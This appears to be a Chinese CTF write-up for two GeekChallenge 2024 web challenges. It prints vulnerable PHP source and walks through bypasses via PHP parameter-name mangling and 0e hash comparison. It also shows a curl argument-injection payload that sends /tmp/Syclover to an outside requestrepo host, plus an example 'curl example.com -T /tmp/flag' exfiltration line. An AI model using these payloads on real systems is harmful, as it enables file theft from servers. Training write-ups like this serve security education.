# 2024 WP

## 1. web-rce-me

### 1.1 源码

```php
<?php
header("Content-type:text/html;charset=utf-8");
highlight_file(__FILE__);
error_reporting(0);

# Can you RCE me?


if (!is_array($_POST["start"])) {
    if (!preg_match("/start.*now/is", $_POST["start"])) {
        if (strpos($_POST["start"], "start now") === false) {
            die("Well, you haven't started.<br>");
        }
    }
}

echo "Welcome to GeekChallenge2024!<br>";

if (
    sha1((string) $_POST["__2024.geekchallenge.ctf"]) == md5("Geekchallenge2024_bmKtL") &&
    (string) $_POST["__2024.geekchallenge.ctf"] != "Geekchallenge2024_bmKtL" &&
    is_numeric(intval($_POST["__2024.geekchallenge.ctf"]))
) {
    echo "You took the first step!<br>";

    foreach ($_GET as $key => $value) {
        $$key = $value;
    }

    if (intval($year) < 2024 && intval($year + 1) > 2025) {
        echo "Well, I know the year is 2024<br>";

        if (preg_match("/.+?rce/ism", $purpose)) {
            die("nonono");
        }

        if (stripos($purpose, "rce") === false) {
            die("nonononono");
        }
        echo "Get the flag now!<br>";
        eval($GLOBALS['code']);
        
        

        
    } else {
        echo "It is not enough to stop you!<br>";
    }
} else {
    echo "It is so easy, do you know sha1 and md5?<br>";
}
?>
```

### 1.2 WP

- **源码分析**

```php
preg_match("/start.*now/is", $_POST["start"]) //匹配字符串，其内必须以 'start 任意除\n等符号的字符串 now' 构成
```

```php
sha1((string) $_POST["__2024.geekchallenge.ctf"]) == md5("Geekchallenge2024_bmKtL") &&//第一个参数的sha1值等于第二个参数的MD5值
(string) $_POST["__2024.geekchallenge.ctf"] != (string) $_POST["Geekchallenge2024_bmKtL"] &&//第一个参数不等于第二个参数
is_numeric(intval($_POST["__2024.geekchallenge.ctf"]))//不知道意义
```

- **绕过点**

  - php 上传非法参数绕过

    POST上传的参数中含非法字符  `.` ，利用php特性：**如果传入 `[` 它被转化为 `_` 之后，后面的字符就会被保留下来不会被替换** 。

    ```
    当PHP版本小于8时，如果参数中出现中括号[，中括号会被转换成下划线_，但是会出现转换错误导致接下来如果该参数名中还有非法字符并不会继续转换成下划线_，也就是说如果中括号[出现在前面，那么中括号[还是会被转换成下划线_，但是因为出错导致接下来的非法字符并不会被转换成下划线_
    ```

    **注：若开头为  `[` 字符，php会认为是数组，但完整参数没有 `]` ，则php会认为是无效的数组名，从而导致整个字段被忽略或解析错误**

    即将第二个下划线替换为 `[` 时，后续非法字符不会处理 

  - sha1加密值 == MD5加密值
  
    非严格比较，使用加密后以 `0e` 开头的字符绕过

## 2.web-ctf_curl

### 2.1源码

```php
<?php
highlight_file('index.php');
// curl your domain
// flag is in /tmp/Syclover

if (isset($_GET['addr'])) {
    $address = $_GET['addr'];
    if(!preg_match("/;|f|:|\||\&|!|>|<|`|\(|{|\?|\n|\r/i", $address)){
        $result = system("curl ".$address."> /dev/null");
    } else {
        echo "Hacker!!!";
    }
}
?>
```

### 2.2 WP

- **源码分析**

  ```php
  preg_match("/;|f|:|\||\&|!|>|<|`|\(|{|\?|\n|\r/i", $address)
  ```

  命令过滤很强，无法实现命令注入

- **绕过点**

  ```php
  $result = system("curl ".$address."> /dev/null");
  ```

  注意到 `curl` 命令，结果虽然放入 /dev/null ，但可通过可控服务器带出数据

  **数据泄露的完整流程：**

  1. 命令执行阶段

  ```
  curl example.com -T /tmp/flag
  -T 参数：触发 HTTP PUT 方法，将文件内容作为请求体发送
  
  文件读取：curl 读取 /tmp/flag 的完整内容到内存
  
  连接建立：与恶意服务器 example.com 建立 TCP 连接
  ```

  2. 网络传输阶段

  ```
  PUT / HTTP/1.1
  Host: example.com
  User-Agent: curl/7.68.0
  Content-Length: 1024
  [空行]
  [文件/tmp/flag的完整内容]
  ```

  - 明文传输：默认使用 HTTP（未加密），文件内容在网络上明文传输


  - 中间人可嗅探：任何网络路径上的设备都可能截获数据

- **具体绕过**

  利用 `https://requestrepo.com/#/requests` 外带数据

  payload：

  ```
  ?addr=xxxxxx.requestrepo.com -T /tmp/Syclover
  ```

  在`https://requestrepo.com/#/requests` 中查看报文中的数据

  ```
  GEEK{de5ef141-0251-4ee6-8cba-d111286f8a33}
  ```

  

# 2023 WP

